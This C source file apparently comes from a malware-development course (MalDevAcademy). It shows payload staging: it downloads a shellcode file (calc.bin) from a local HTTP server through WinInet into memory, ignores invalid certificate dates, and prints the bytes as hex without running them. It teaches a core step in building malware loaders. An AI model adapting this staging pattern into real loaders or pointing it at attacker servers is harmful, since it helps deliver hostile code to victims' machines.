// @NUL0x4C | @mrd0x : MalDevAcademy

#include <Windows.h>
#include <stdio.h>
#include <WinInet.h>

#pragma comment (lib, "Wininet.lib")

// Python -m http.server 8000
// Have calc.bin in the directory
#define PAYLOAD	L"http://127.0.0.1:8080/calc.bin"

// Get a file's payload from a url (http or https)
// Return a base address of a heap allocated buffer, thats the payload
// Return the payload's size
BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bSTATE			= TRUE;

	HINTERNET	hInternet		= NULL,
				hInternetFile	= NULL;

	DWORD		dwBytesRead		= NULL;

	SIZE_T		sSize			= NULL; 	 			// Used as the total payload size

	PBYTE		pBytes			= NULL,					// Used as the total payload heap buffer
				pTmpBytes		= NULL;					// Used as the tmp buffer (of size 1024)

	// Opening the internet session handle, all arguments are NULL here since no proxy options are required
	hInternet = InternetOpenW(L"MalDevAcademy", NULL, NULL, NULL, NULL);
	if (hInternet == NULL){
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Opening the handle to the payload using the payload's URL
	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL){
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Allocating 1024 bytes to the temp buffer
	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL){
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE){

		// Reading 1024 bytes to the tmp buffer. The function will read less bytes in case the file is less than 1024 bytes.
		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		// Calculating the total size of the total buffer 
		sSize += dwBytesRead;

		// In case the total buffer is not allocated yet
		// then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			// Otherwise, reallocate the pBytes to equal to the total size, sSize.
			// This is required in order to fit the whole payload
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}
		
		// Append the temp buffer to the end of the total buffer
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

		// Clean up the temp buffer
		memset(pTmpBytes, '\0', dwBytesRead);

		// If less than 1024 bytes were read it means the end of the file was reached
		// Therefore exit the loop 
		if (dwBytesRead < 1024){
			break;
		}

		// Otherwise, read the next 1024 bytes
	}
	

	// Saving 
	*pPayloadBytes	=	pBytes;
	*sPayloadSize	=	sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);											// Closing handle 
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);										// Closing handle
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	// Closing Wininet connection
	if (pTmpBytes)
		LocalFree(pTmpBytes);													// Freeing the temp buffer
	return bSTATE;
}



int main() {

	SIZE_T	Size = NULL;
	PBYTE	Bytes = NULL;


	// Reading the payload 
	if (!GetPayloadFromUrl(PAYLOAD, &Bytes, &Size)) {
		return -1;
	}

	
	printf("[i] Bytes : 0x%p \n", Bytes);
	printf("[i] Size  : %ld \n", Size);

	// Printing it
	for (int i = 0; i < Size; i++){
		if (i % 16 == 0)
			printf("\n\t");

		printf("%0.2X ", Bytes[i]);
	}
	printf("\n\n");

	// Freeing
	LocalFree(Bytes);
	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}






